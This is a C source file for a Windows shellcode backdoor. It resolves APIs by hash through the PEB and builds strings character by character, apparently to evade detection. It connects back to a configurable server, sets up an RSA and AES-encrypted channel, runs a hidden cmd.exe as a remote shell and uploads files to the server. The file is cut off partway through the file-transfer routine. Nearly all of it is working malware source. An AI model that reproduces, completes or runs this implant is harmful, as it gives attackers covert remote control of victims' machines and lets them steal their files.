/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "include.h"

#define RVA2OFS(type, base, rva) (type)((ULONG_PTR) base + rva)

#define SPP_DATA_LEN  2048     // in bytes
#define SPP_RSA_LEN   2048     // in bits
#define SPP_MAC_LEN   12
#define SPP_TAG_LEN   12
#define SPP_BLK_LEN   16
#define SPP_SIG_LEN   SPP_RSA_LEN/8

#define SPP_EKEY_LEN  32
#define SPP_MKEY_LEN  16
#define SPP_CTR_LEN   16
#define SPP_NONCE_LEN 12
#define SPP_TEK_LEN   SPP_EKEY_LEN+SPP_MKEY_LEN+SPP_CTR_LEN

#define SPP_CMD_SHELL 1
#define SPP_CMD_PUT   2
#define SPP_CMD_GET   3
#define SPP_CMD_TERM  4
#define SPP_CMD_CLOSE 5
#define SPP_CMD_HELP  6
#define SPP_CMD_LIST  7
#define SPP_CMD_RLIST 8

#define SPP_ERR_OK    0
#define SPP_ERR_SCK   -1
#define SPP_ERR_LEN   -2
#define SPP_ERR_MAC   -3
#define SPP_ERR_ENC   -4

#define SPP_ENCRYPT 0
#define SPP_DECRYPT 1

#pragma pack(1)
// spp length
typedef union _spp_len_t {
  uint8_t  b[sizeof(uint32_t)+SPP_MAC_LEN];
  uint32_t w;
  struct {
    uint16_t buflen;
    uint16_t padlen;
  };
} spp_len;

// spp command structure
typedef struct _spp_cmd_t {
  uint32_t opt;
  uint8_t  buf[SPP_DATA_LEN+SPP_MAC_LEN];
} spp_cmd;

// spp file transfer structure
typedef struct _spp_fx_t {
  uint32_t err;
  uint64_t size;
} spp_fx;

// spp data type
typedef union _spp_data_t {
  spp_cmd cmd;
  spp_fx  fx;
  uint8_t b[SPP_DATA_LEN+SPP_MAC_LEN];
} spp_data;

// spp packet structure
typedef struct _spp_blk_t {
  spp_len  len;
  spp_data data;
} spp_blk;

// traffic encryption keys
typedef struct _spp_tek_t {
  uint8_t ekey[SPP_EKEY_LEN];   // 256-bit symmetric key for encryption
  uint8_t ctr[SPP_CTR_LEN];     // 128-bit block counter
  uint8_t mkey[SPP_MKEY_LEN];   // 128-bit key for message authentication
  uint8_t pad[SPP_DATA_LEN];
} spp_tek;

// shellcode data structure
typedef struct _sc_v_tbl_t {
  spp_blk             blk;
  SOCKET              s;      // socket
  HANDLE              out1;   // CreateNamedPipe
  HANDLE              in0;    // CreatePipe read
  HANDLE              in1;    // CreatePipe write
  HANDLE              out0;   // CreateFile
  // event handles start here
  HANDLE              evt0;   // WSACreateEvent
  HANDLE              evt1;   // CreateEvent for cmd.exe
  PROCESS_INFORMATION pi;
  DWORD               evt_cnt;
  DWORD               secure;
  HCRYPTPROV          hProv;
  spp_tek             tek;
  aes_ctx             ctx;
} v_tbl;

// api table structure
typedef struct _sc_f_tbl_t {
  union {
    LPVOID api[28];
    struct {
      // kernel32
      CreateNamedPipe_t                pCreateNamedPipe;
      CreatePipe_t                     pCreatePipe;
      CreateFile_t                     pCreateFile;
      WriteFile_t                      pWriteFile;
      ReadFile_t                       pReadFile;
      GetOverlappedResult_t            pGetOverlappedResult;
      CreateProcess_t                  pCreateProcess;
      TerminateProcess_t               pTerminateProcess;
      CreateEvent_t                    pCreateEvent;
      GetTickCount_t                   pGetTickCount;
      GetLastError_t                   pGetLastError;
      CloseHandle_t                    pCloseHandle;
      WaitForMultipleObjects_t         pWaitForMultipleObjects;
      Wow64DisableWow64FsRedirection_t pWow64DisableWow64FsRedirection;
      GetFileSizeEx_t                  pGetFileSizeEx;
      // ws2_32
      socket_t                         psocket;
      connect_t                        pconnect;
      send_t                           psend;
      recv_t                           precv;
      closesocket_t                    pclosesocket;
      ioctlsocket_t                    pioctlsocket;
      WSAEventSelect_t                 pWSAEventSelect;
      WSAEnumNetworkEvents_t           pWSAEnumNetworkEvents;
      WSACreateEvent_t                 pWSACreateEvent;
      WSAStartup_t                     pWSAStartup;
      // advapi32
      CryptAcquireContextA_t           pCryptAcquireContext;
      CryptGenRandom_t                 pCryptGenRandom;
      CryptReleaseContext_t            pCryptReleaseContext;
    };
  };
} f_tbl;

typedef struct sc_tbl_t {
  f_tbl f; // function table  (code section)
  v_tbl v; // variables table (data section)
} sc_tbl;

#define K32 "kernel32.dll"
#define W32 "ws2_32.dll"
#define A32 "advapi32.dll"

int key_xchg(sc_tbl*);
void dispatch(sc_tbl*);
LPVOID getapi (DWORD);
  
#define HTONS(x) ((((WORD)(x) & 0xff00) >> 8) | (((WORD)(x) & 0x00ff) << 8))

/**F*********************************************
 *
 * entrypoint of PIC
 *
 ************************************************/
#ifdef XALONE
void mainCRTStartup(void)
#else
void main(void)
#endif
{
  WSADATA            wsa;
  struct sockaddr_in sin;
  sc_tbl             x;
  DWORD              i, cnt;
  int                r;
  char               ws2_32[]={'w','s','2','_','3','2','\0'};
  char               adv_32[]={'a','d','v','a','p','i','3','2','\0'};
  LoadLibrary_t      pLoadLibrary;

  DWORD api_tbl[28] = 
  { // kernel32
    0xA22F8F7B, 0xAC64004D, 0x312F1B4D, 0x9E0E3C90,
    0xC6F80331, 0x96E33079, 0x6712E6B0, 0xD33BF3FB,
    0x58FE46D3, 0xA090D84A, 0x54770C07, 0xACCC1CBF,
    0x16DF07F7, 0x77230436, 0x8CA6253D,
      // ws2_32
    0x4D1A55A1, 0x93984106, 0xC95F8C62, 0xFA68BEA4,
    0xD71BEFFE, 0xD11842A4, 0x03131442, 0xFF65A0DD,
    0xDD1310EB, 0xB75BA04F,
      // advapi32
    0xDA276C85, 0x47032348, 0x6B977E2A };
  
  // zero initialize memory
  memset ((uint8_t*)&x, 0, sizeof(x));
  
  // load required modules just in case unavailable in PEB
  // get address for LoadlibraryA
  pLoadLibrary=(LoadLibrary_t)getapi(0x9CAA7645);
  
  // load ws2_32 
  pLoadLibrary(ws2_32);
  
  // load advapi32
  pLoadLibrary(adv_32);
  
  // resolve our api addresses
  for (i=0; i<sizeof(api_tbl)/sizeof(DWORD); i++) {
    x.f.api[i]=getapi(api_tbl[i]);
    if (x.f.api[i] == NULL) {
      DEBUG_PRINT("Critical failure: Unable to resolve API for %08X",
          api_tbl[i]);
      return;
    }
  }
  
  // initialize winsock
  x.f.pWSAStartup (MAKEWORD(2, 2), &wsa);
  
  // initialize crypto
  x.v.hProv=0;
  
  x.f.pCryptAcquireContext (&x.v.hProv, 
      NULL, NULL, PROV_RSA_AES, 
      CRYPT_VERIFYCONTEXT | CRYPT_SILENT);
      
  // create tcp socket
  x.v.s=x.f.psocket (AF_INET, 
      SOCK_STREAM, IPPROTO_TCP);
      
  // initialize network address, this requires changing before deployment
  sin.sin_port             = HTONS(1234);
  sin.sin_family           = AF_INET;
  sin.sin_addr.S_un.S_addr = 0x0100007F; // 127.0.0.1
  
  // connect to server
  r=x.f.pconnect (x.v.s, 
      (const struct sockaddr*)&sin, sizeof (sin));
  
  if (!r)
  {
    // perform key exchange
    key_xchg(&x);
    // execute dispatcher
    dispatch(&x);
  }
  // close socket
  x.f.pclosesocket (x.v.s);
  // release crypto context
  x.f.pCryptReleaseContext(x.v.hProv, 0);
  
  // cleanup and exit, not used in final code
  //WSACleanup();
  //return 0;
}

/**F*********************************************
 *
 * Obtain address of API from PEB based on hash
 *
 ************************************************/
LPVOID getapi (DWORD dwHash)
{
  PPEB                     peb;
  PMY_PEB_LDR_DATA         ldr;
  PMY_LDR_DATA_TABLE_ENTRY dte;
  PIMAGE_DOS_HEADER        dos;
  PIMAGE_NT_HEADERS        nt;
  PVOID                    base;
  DWORD                    cnt=0, ofs=0, idx, rva, dll_h;
  PIMAGE_DATA_DIRECTORY    dir;
  PIMAGE_EXPORT_DIRECTORY  exp;
  PDWORD                   adr;
  PDWORD                   sym;
  PWORD                    ord;
  PCHAR                    api, dll;
  LPVOID                   api_adr=0;
  
  union {
    uint8_t  b[32];
    uint32_t w[8];
  } h;
  
  SHA3_CTX                 ctx1, ctx2;
  int                      i;
  uint8_t                  f[64+1]; 
  uint32_t                 s = 0x9e3779b9UL;
  
#if defined(_WIN64)
  peb = (PPEB) __readgsqword(0x60);
#else
  peb = (PPEB) __readfsdword(0x30);
#endif

  ldr = (PMY_PEB_LDR_DATA)peb->Ldr;
  
  // for each DLL loaded
  for (dte=(PMY_LDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
       dte->DllBase != NULL; 
       dte=(PMY_LDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
  {
    base = dte->DllBase;
    dos  = (PIMAGE_DOS_HEADER)base;
    nt   = RVA2OFS(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir  = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva  = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no exports, continue
    if (rva==0) continue;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2OFS(ULONG_PTR, base, rva);
      
    cnt = exp->NumberOfNames;
    adr = RVA2OFS(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2OFS(PDWORD,base, exp->AddressOfNames);
    ord = RVA2OFS(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2OFS(PCHAR, base, exp->Name);
    
    SHA3_Init(&ctx1, SHA3_256);   // create 256-bit hash
    SHA3_Update(&ctx1, &s, sizeof(s));  // unique secret

    // copy dll converted to lowercase
    for (i=0; dll[i] != 0 && i<sizeof(f)-1; i++) {
      f[i] = (dll[i] | 0x20);
    }
    f[i] = 0;
    SHA3_Update(&ctx1, f, i);
  
    do {
      // calculate hash of api string
      api = RVA2OFS(PCHAR, base, sym[cnt-1]);
      // update context with api
      for (i=0; api[i] != 0; i++);
      memcpy ((uint8_t*)&ctx2, (uint8_t*)&ctx1, sizeof(SHA3_CTX));
      SHA3_Update(&ctx2, api, i);
      SHA3_Final(h.b, &ctx2);
      // add to DLL hash and compare
      if (h.w[0] == dwHash) {
        // return address of function
        api_adr=RVA2OFS(LPVOID, base, adr[ord[cnt-1]]);
        break;
      }
    } while (--cnt && api_adr==0);
    if (api_adr!=0) break;
  }
  return api_adr;
}

void spp_dump(void *tek, int len, char *str) {
#if defined(DEBUG) && DEBUG > 0
  int i;
  printf ("\n%s = ", str);
  for (i=0; i<len; i++) {
    printf ("%02x", ((uint8_t*)tek)[i]);
  }
#endif
}

void spp_mac(sc_tbl *x, void *data, uint32_t data_len, uint8_t *out);
void aes_ctr_encrypt(sc_tbl *c, void *data, uint32_t len);

void show_keys(sc_tbl *c) {
#if defined(DEBUG) && DEBUG > 0
  int     i;
  spp_len magic;
  uint8_t mac[SPP_MAC_LEN];
  
  memset((uint8_t*)&magic, 0, sizeof(magic));
  
  printf ("\nAES Key : ");
  for (i=0; i<SPP_EKEY_LEN; i++) {
    printf ("%02x", c->v.tek.ekey[i]);
  }
  printf ("\nMAC Key : ");
  for (i=0; i<SPP_MKEY_LEN; i++) {
    printf ("%02x", c->v.tek.mkey[i]);
  }
  printf ("\nAES CTR : ");
  for (i=0; i<SPP_CTR_LEN; i++) {
    printf ("%02x", c->v.tek.ctr[i]);
  }
  /*spp_mac(c, &magic, 4, mac);
  spp_dump(mac, 16, "mac");
  
  memset((uint8_t*)&magic, 0, sizeof(magic));
  spp_dump((uint8_t*)&magic, 16, "before enc");
  
  aes_ctr_encrypt(c, (uint8_t*)&magic, sizeof(magic));
  spp_dump((uint8_t*)&magic, 16, "after enc");
  
  aes_ctr_encrypt(c, (uint8_t*)&magic, sizeof(magic));
  spp_dump((uint8_t*)&magic, 16, "after dec");*/
#endif
}

/**F*********************************************
 *
 * Generate random bytes
 *
 ************************************************/
VOID spp_rand (sc_tbl *x, PBYTE out, DWORD outlen)
{
  x->f.pCryptGenRandom (x->v.hProv, outlen, out);
}

/**F*********************************************
 *
 * Pad SPP data buffer with random bytes
 *
 ************************************************/
void spp_pad (sc_tbl *x)
{
  x->v.blk.len.padlen = (x->v.blk.len.buflen & (SPP_BLK_LEN-1));
  
  // if not zero
  if (x->v.blk.len.padlen) {
    // calculate how much padding bytes required
    x->v.blk.len.padlen = (SPP_BLK_LEN - x->v.blk.len.padlen);
    
    // generate random bytes
    spp_rand (x, &x->v.blk.data.b[x->v.blk.len.buflen], x->v.blk.len.padlen);
    
    // update block len to include padding
    x->v.blk.len.buflen += x->v.blk.len.padlen;
  }
}
/**F*********************************************
 *
 * Generate MAC of SPP data
 *
 ************************************************/
void spp_mac(sc_tbl *x, void *data, uint32_t data_len, uint8_t *out)
{
  SHA3_CTX c;
  uint8_t  m[SHA3_256];
  int      i;
  
  DEBUG_PRINT("Generating MAC for %i bytes of data", data_len);
  spp_dump(data, data_len, "mac data");
  
  SHA3_Init(&c, SHA3_256);                       // initialize
  SHA3_Update(&c, x->v.tek.mkey, SPP_MKEY_LEN);  // add mac key
  SHA3_Update(&c, data, data_len);               // add data
  SHA3_Final(m, &c);                             // save

  memcpy(out, m, SPP_MAC_LEN);
}
/**F*********************************************
 *
 * xor block of plaintext with ciphertext
 *
 ************************************************/
uint32_t memxor (uint8_t *pt, uint8_t *ct, uint32_t len)
{
  uint32_t i;
  
  len=(len>SPP_BLK_LEN) ? SPP_BLK_LEN:len;
  
  for (i=0; i<len; i++) {
    pt[i] ^= ct[i];
  }
  return len;
}

/**F*********************************************
 *
 * increase the counter block
 *
 ************************************************/
void update_ctr (uint8_t *ctr)
{
  int i;
  
  for (i=SPP_CTR_LEN-1; i>=0; i--) {
    ctr[i]++;
    if (ctr[i]) {
      break;
    }
  }
}

void aes_ctr_encrypt(sc_tbl *c, void *data, uint32_t len)
{
  uint32_t i, r, inlen=len;
  uint8_t  *p=(uint8_t*)data;
  uint8_t  ctr[SPP_CTR_LEN];
  
  DEBUG_PRINT("Decrypting/Encrypting %i bytes", len);
  spp_dump(data, len, "enc data");
  
  while (inlen)
  {
    // copy counter into temp space
    memcpy (ctr, c->v.tek.ctr, SPP_CTR_LEN);
    
    // encrypt with AES-256 in ECB mode
    AES_encrypt (ctr, ctr, &c->v.ctx, AES_ENCRYPT);
      
    // xor against plaintext
    r=memxor (p, ctr, inlen);
    
    // update counter
    update_ctr(c->v.tek.ctr);
    
    // advance plaintext position
    p += r;
    
    // decrease length of input
    inlen -= r;
  }
}

/**F*********************************************
 *
 * Encrypt packet, using AES in CTR mode
 *
 ************************************************/
int spp_crypt (sc_tbl *c, void *data, 
    uint32_t len, int enc)
{
  uint8_t  mac[SPP_MAC_LEN];
  uint8_t  *p=(uint8_t*)data;
  uint32_t data_len=len;
  
  DEBUG_PRINT("Entering spp_crypt with %i bytes", len);
  
  if (enc==SPP_DECRYPT)
  {
    // subtract MAC length
    data_len -= SPP_MAC_LEN;
    
    // generate MAC of encrypted data
    spp_mac (c, data, data_len, mac);
    
    // compare if equal
    if (memcmp (mac, &p[data_len], SPP_MAC_LEN)!=0) {
      DEBUG_PRINT("mac is invalid");
      spp_dump(mac, SPP_MAC_LEN, "mac result");
      return SPP_ERR_MAC;
    }
  }
  // encrypt or decrypt data
  aes_ctr_encrypt (c, data, data_len);
    
  if (enc==SPP_ENCRYPT)
  {
    // add mac of encrypted data
    spp_mac (c, data, data_len, &p[data_len]);
    data_len += SPP_MAC_LEN;
  }
  DEBUG_PRINT("Leaving spp_crypt with %i bytes", data_len);
  return data_len;
}

/**F*********************************************
 *
 * send packet, fragmented if required
 *
 ************************************************/
int send_pkt (sc_tbl *c, void *in, uint32_t inlen)
{
  int      len;
  uint32_t sum;
  uint8_t  *p=(uint8_t*)in;
  
  for (sum=0; sum<inlen; sum += len) {
    len=c->f.psend (c->v.s, &p[sum], inlen - sum, 0);
    if (len<=0) return -1;
  }
  return sum;
}

/**F*********************************************
 *
 * send data, encrypted if required
 *
 ************************************************/
int spp_send (sc_tbl *c)
{
  int      len;
  uint32_t data_len = c->v.blk.len.w;
  
  DEBUG_PRINT("entering spp_send to send %i bytes", data_len);
  
  // 1. if not secure mode, goto step 3
  if (c->v.secure) {
    if (data_len) c->v.blk.len.w += SPP_MAC_LEN;
    // 2. encrypt the length, add mac
    spp_crypt(c, c->v.blk.len.b, sizeof(int), SPP_ENCRYPT);
  }
  // 3. send length
  len = send_pkt(c, &c->v.blk.len.b, sizeof(spp_len));
  
  if (data_len)
  {
    // 4. if not secure mode, goto step 6
    if (c->v.secure) {
      // 5. encrypt data
      data_len=spp_crypt(c, &c->v.blk.data.b, data_len, SPP_ENCRYPT);
    }
    // 6. send data
    len = send_pkt (c, &c->v.blk.data.b, data_len);
  }
  DEBUG_PRINT("leaving spp_send after sending %i bytes", len);
  
  // 7. return OK if no error
  return (len < 0) ? SPP_ERR_SCK : SPP_ERR_OK;
}

/**F*********************************************
 *
 * receive packet, fragmented if required
 *
 ************************************************/
int recv_pkt (sc_tbl *c, void *out, uint32_t outlen) 
{
  int      len;
  uint32_t sum;
  uint8_t  *p=(uint8_t*)out;

  for (sum=0; sum<outlen; sum += len) {
    len=c->f.precv (c->v.s, &p[sum], outlen - sum, 0);
    if (len<=0) return -1;
  }
  return sum;
}

/**F*********************************************
 *
 * receive data, decrypt if required
 *
 ************************************************/
int spp_recv (sc_tbl *c)
{
  int len;
  
  DEBUG_PRINT("entering spp_recv");
  
  // 1. receive the length
  len=recv_pkt (c, c->v.blk.len.b, sizeof(spp_len));

  spp_dump(c->v.blk.len.b, sizeof(spp_len), "length");
  
  // 2. if socket error, return SCK error
  if (len<=0) {
    DEBUG_PRINT("recv_pkt for length error");
    return SPP_ERR_SCK;
  }
  
  // 3. if not secure, goto step 6
  if (c->v.secure) {
    DEBUG_PRINT("Decrypting Length: %08X", c->v.blk.len.w);
    // 4. decrypt the length, verify mac
    len=spp_crypt(c, c->v.blk.len.b, sizeof(spp_len), SPP_DECRYPT);
    // 5. if decryption error, return ENC error
    if (len<0) {
      DEBUG_PRINT("spp_crypt error for length");
      return SPP_ERR_ENC;
    }
    DEBUG_PRINT("buf len = %i len = %i", c->v.blk.len.buflen, len);
  }
  
  // 6. if zero length, return OK
  if (c->v.blk.len.buflen==0) {
    DEBUG_PRINT("buflen is zero");
    return SPP_ERR_OK;
  }

  // 7. if buflen problem, return LEN error
  if (c->v.blk.len.buflen > SPP_DATA_LEN+SPP_MAC_LEN) {
    DEBUG_PRINT("buflen exceeds max allowed");
    return SPP_ERR_LEN;
  }

  // 8. if padlen problem, return LEN error
  if (c->v.blk.len.padlen >= SPP_BLK_LEN) {
    DEBUG_PRINT("padlen exceeds max allowed");
    return SPP_ERR_LEN;
  }
  
  // 9. receive the data
  len=recv_pkt (c, &c->v.blk.data.b, 
      c->v.blk.len.buflen);
  
  // 10. if socket error, return SCK error
  if (len<=0) {
    DEBUG_PRINT("recv_pkt error for data");
    return SPP_ERR_SCK;
  }
  
  // 11. if not secure, goto step 14
  if (c->v.secure) {
    // 12. decrypt the length, verify mac
    len=spp_crypt(c, &c->v.blk.data.b, 
        c->v.blk.len.buflen, SPP_DECRYPT);
    // 13. if decryption error, return ENC error
    if (len<0) {
      DEBUG_PRINT("spp_crypt error for data");
      return SPP_ERR_ENC;
    }
    c->v.blk.len.buflen = len;
    DEBUG_PRINT("buf len = %i len = %i", c->v.blk.len.buflen, len);
    c->v.blk.data.b[len] = 0;
  }
  
  DEBUG_PRINT("leaving spp_recv");
  
  // 14. return OK if no errors
  return (len<=0) ? SPP_ERR_SCK : SPP_ERR_OK;
}

/**F*********************************************
 *
 * Generate SPP session keys
 *
 ************************************************/
// generate iv, mac and enc keys
void spp_genkeys(sc_tbl *x)
{
  BYTE     rnd[64];
  SHA3_CTX c;
  
  // get 256-bits of random bytes
  spp_rand (x, rnd, sizeof(rnd));
  
  // get 512-bit hash
  SHA3_Init(&c, SHA3_512);
  SHA3_Update(&c, rnd, sizeof(rnd));
  SHA3_Final(&x->v.tek, &c);
  
  // set 256-bit key for aes
  AES_setkey(x->v.tek.ekey, &x->v.ctx);
}

/**F*********************************************
 *
 * Obtain public key from server.
 * Send encrypted session keys.
 *
 ************************************************/
int key_xchg (sc_tbl *x)
{
  int     err=SPP_ERR_OK;
  bn      r, b, e, m;
  spp_blk out;
  
  // generate traffic encryption keys
  spp_genkeys(x);
  
  // zero buffers for exponent, modulus and result
  bn_zero(&b);
  bn_zero(&e);
  bn_zero(&m);

  // set public exponent
  e.v32[0] = 65537;
  
  // receive modulus
  err=spp_recv(x);
  
  if (err!=SPP_ERR_OK) return err;
  
  // copy modulus to bn
  memcpy (m.v8, x->v.blk.data.b, x->v.blk.len.buflen);
  
  DEBUG_PRINT ("\nreceived %i byte modulus = ", 
      x->v.blk.len.buflen);
      
  spp_dump(m.v8, x->v.blk.len.w, "modulus");
  
  // copy session keys to bn
  memcpy (b.v8, (uint8_t*)&x->v.tek, SPP_TEK_LEN);
  
  // pad remainder of buffer so that we have at least
  // same number of bytes as modulus
  spp_rand (x, &b.v8[SPP_TEK_LEN], 
      (SPP_RSA_LEN/8) - (SPP_TEK_LEN + 2));
  
  // encrypt session keys
  bn_expmod(&r, &b, &e, &m);
  
  // copy encrypted keys to buffer
  memcpy (x->v.blk.data.b, r.v8, x->v.blk.len.w);
  show_keys(x);
  
  // send encrypted keys
  err=spp_send(x);
  
  if (err!=SPP_ERR_OK) return err;
  
  x->v.secure=1;
  return 1;
}

/**F*********************************************
 *
 * Wait for events from multiple sources
 *
 ************************************************/
DWORD wait_evt (sc_tbl *x)
{
  WSANETWORKEVENTS ne;
  u_long           opt;
  DWORD            e;
  
  // set to non-blocking mode.
  // monitor TCP read/close events
  x->f.pWSAEventSelect (x->v.s, x->v.evt0, 
      FD_CLOSE | FD_READ);
    
  // wait for multiple events to trigger
  e=x->f.pWaitForMultipleObjects (x->v.evt_cnt, 
      &x->v.evt0, FALSE, INFINITE);
  
  DEBUG_PRINT("event is %08X", e);
  
  // enumerate events for socket
  x->f.pWSAEnumNetworkEvents (x->v.s, x->v.evt0, &ne);
  
  // clear monitor
  x->f.pWSAEventSelect (x->v.s, x->v.evt0, 0);
  
  // set socket to blocking mode
  opt=0;
  x->f.pioctlsocket (x->v.s, FIONBIO, &opt);
  
  // closed?
  if (ne.lNetworkEvents & FD_CLOSE) {
    DEBUG_PRINT("socket closing");
    e = ~0UL;
  }
  return e;
}

/**F*********************************************
 *
 * Main loop for cmd.exe
 *
 * Writes input from server to stdin
 * Reads output from stdout and sends to server
 *
 ************************************************/
void cmd_loop(sc_tbl *x)
{
  DWORD      e, p=0;
  OVERLAPPED lap;

  DEBUG_PRINT("Entering cmd_loop");
  
  memset((uint8_t*)&lap, 0, sizeof(lap));

  x->v.evt_cnt=3;
  
  // assign event handle for stdout  
  lap.hEvent=x->v.evt1;
  
  for (;;)
  {
    e=wait_evt(x);
    
    // is this socket event?
    if (e == 0) 
    {
      DEBUG_PRINT("receiving data");
      // receive data
      spp_recv(x);
      if (x->v.blk.len.w<=0) break;
      
      DEBUG_PRINT("writing to stdin");
      // write to stdin
      x->f.pWriteFile (x->v.in0, x->v.blk.data.b, 
          x->v.blk.len.w, &x->v.blk.len.w, 0);             
    } else
   
    // stdout/stderr of cmd.exe?
    if (e == 1) 
    {
      // no read pending
      if (p == 0)
      {
        DEBUG_PRINT("reading from stdout");
        
        x->f.pReadFile (x->v.out1, x->v.blk.data.b, 
            BUFSIZ, &x->v.blk.len.w, &lap);
        p++;
      } else {
        DEBUG_PRINT("getting overlapped result");
        
        if (!x->f.pGetOverlappedResult (x->v.out1, 
            &lap, &x->v.blk.len.w, FALSE)) 
        {
          DEBUG_PRINT("overlapped error %i", 
              x->f.pGetLastError());
          break;
        }
      }
      if (x->v.blk.len.w != 0)
      {
        DEBUG_PRINT("sending data");
        spp_send(x);
        if (x->v.blk.len.w<=0) break;
        p--;
      }
    } else {
      // either the socket closed or cmd.exe ended
      DEBUG_PRINT("cmd.exe ended or socket closed");
      break;
    }
  }
  DEBUG_PRINT("Leaving cmd_loop");
  x->v.evt_cnt=1;
}

/**F*********************************************
 *
 * Spawn cmd.exe for server
 *
 ************************************************/
void c_cmd (sc_tbl *x)
{
  SECURITY_ATTRIBUTES sa;
  STARTUPINFO         si;
  DWORD               i, t;
  char                pname[32];
  
  char pipe[] =
    { '\\','\\','.','\\','p','i','p','e','\\'};
  
  char cmd[] =
    { 'c','m','d','\0' };
  
  memset (pname, 0, 32);
  memcpy (pname, pipe, 9);
  
  // set last 8 bytes to something "unique"
  // which avoids issues with duplicate pipe names
  t=x->f.pGetTickCount();
  for (i=0; i<8; i++) {
    pname[9+i] = (t % 26) + 'a';
    t >>= 2;
  }
  
  DEBUG_PRINT("Entering c_cmd");
  // initialize security descriptor
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  // create named pipe for stdout + stderr of cmd.exe

  DEBUG_PRINT("creating named pipe %s", pname);
  
  x->v.out1 = x->f.pCreateNamedPipe (pname, 
      PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
      PIPE_TYPE_BYTE, 1, 0, 0, 0, &sa);
        
  if (x->v.out1 != INVALID_HANDLE_VALUE)
  {
    DEBUG_PRINT("creating anonymous pipes");
    // create anonymous pipe for reading stdin of cmd.exe
    if (x->f.pCreatePipe (&x->v.in1, &x->v.in0, &sa, 0))
    {
      DEBUG_PRINT("opening named pipe for cmd.exe");
      // open named pipe for write access
      x->v.out0 = x->f.pCreateFile (pname, GENERIC_WRITE, 
          0, &sa, OPEN_EXISTING, 0, NULL);
          
      if (x->v.out0 != INVALID_HANDLE_VALUE)
      {
        DEBUG_PRINT("creating event");
        // create event for stdout events
        x->v.evt1 = x->f.pCreateEvent (NULL, 
            TRUE, TRUE, NULL);
  
        // zero initialize STARTUPINFO
        memset((uint8_t*)&si, 0, sizeof(si));
        
        //SetHandleInformation (x->v.in0, HANDLE_FLAG_INHERIT, 0);
        //SetHandleInformation (x->v.out1, HANDLE_FLAG_INHERIT, 0);
        
        si.cb         = sizeof (si);
        // assign read handle of anonymous pipe
        si.hStdInput  = x->v.in1;     
        // assign write handle of named pipe to stdout/stderr
        si.hStdError  = x->v.out0;    
        si.hStdOutput = x->v.out0;
        si.dwFlags    = STARTF_USESTDHANDLES;
  
        DEBUG_PRINT("Executing cmd.exe");
        // execute cmd.exe without visible window
        if (x->f.pCreateProcess (NULL, cmd, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &x->v.pi))
        {
          // enter main loop
          cmd_loop(x);
          // just incase socket closed, terminate cmd.exe
          x->f.pTerminateProcess (x->v.pi.hProcess, 0);
          // close handles
          x->f.pCloseHandle(x->v.pi.hThread);
          x->f.pCloseHandle(x->v.pi.hProcess);
        } else {
          DEBUG_PRINT("CreateProcess() failed with error code %i", 
            x->f.pGetLastError());
        }
        // close event for stdout of cmd.exe
        x->f.pCloseHandle(x->v.evt1);
        // close named pipe handle
        x->f.pCloseHandle(x->v.out0);
      }
      // close anon pipes
      x->f.pCloseHandle(x->v.in0);
      x->f.pCloseHandle(x->v.in1);
    }
    // close named pipe
    x->f.pCloseHandle(x->v.out1);
  } else {
    DEBUG_PRINT("CreateNamedPipe error %i", 
        x->f.pGetLastError());
  }
  DEBUG_PRINT("Leaving c_cmd");
  // tell server we're exiting c_cmd
  x->v.blk.len.w=0;
  spp_send(x);
}

/**F*********************************************
 *
 * Send a file to server
 *
 ************************************************/
void c_get(sc_tbl *x)
{
  HANDLE in;
  int    eof;
  
  DEBUG_PRINT("c_get: attempting to send %s", 
    x->v.blk.data.cmd.buf);
  
  in=x->f.pCreateFile ((LPCTSTR)x->v.blk.data.cmd.buf, 
      GENERIC_READ, FILE_SHARE_READ, NULL, 
      OPEN_EXISTING, 0, NULL);
      
  // report open status to server
  x->v.blk.data.fx.err = x->f.pGetLastError();
  x->v.blk.len.w  = sizeof(int);
  
  // if status is ok, send the file size also
  if (x->v.blk.data.fx.err == ERROR_SUCCESS) {
    x->v.blk.len.w += sizeof(uint64_t);
    x->f.pGetFileSizeEx (in, (PLARGE_INTEGER)&x->v.blk.data.fx.size);
  }
  // now send details
  spp_send(x);
  
  if (in!=INVALID_HANDLE_VALUE)
  {
    for (;;) 
    {
      // read data from file
      x->f.pReadFile(in, x->v.blk.data.b, 
        SPP_DATA_LEN, &x->v.blk.len.w, 0);
        
      // zero length indicates EOF
      eof=(x->v.blk.len.w==0);
      
      if (spp_send(x)!=SPP_ERR_OK) {
        DEBUG_PRINT("spp_send failed");
